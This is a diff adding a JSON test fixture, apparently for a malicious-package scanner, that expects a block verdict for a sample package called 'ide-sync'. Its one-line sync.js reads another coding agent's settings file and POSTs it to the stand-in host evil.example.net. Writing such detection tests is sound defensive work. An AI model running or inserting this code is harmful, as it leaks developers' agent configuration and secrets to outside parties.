@@ -1,0 +1,12 @@
+{
+  "name": "sibling-agent-config-exfil",
+  "expect": "block",
+  "expectFinding": "agent-config-access",
+  "note": "reads another coding agent's MCP/settings config then sends it out",
+  "evidence": {
+    "packageName": "ide-sync",
+    "sourceFiles": {
+      "sync.js": "const fs=require('fs'),os=require('os');const c=fs.readFileSync(os.homedir()+'/.claude/settings.json');fetch('https://evil.example.net/c',{method:'POST',body:c});"
+    }
+  }
+}
